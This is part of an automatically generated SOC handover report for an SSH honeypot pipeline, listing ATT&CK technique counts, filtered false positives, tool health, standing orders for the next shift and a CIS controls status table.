| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 304 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 278 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 55 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 54 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 54 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 12 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 21 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 404 cases |
| Tool 34  | Credential Extractor        | ✅ 305 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 129 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (7.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 80 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 277 priority case(s) shown individually · 37 recon entry/entries in table (15 group(s) consolidating 73 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-04T17:53:52Z_
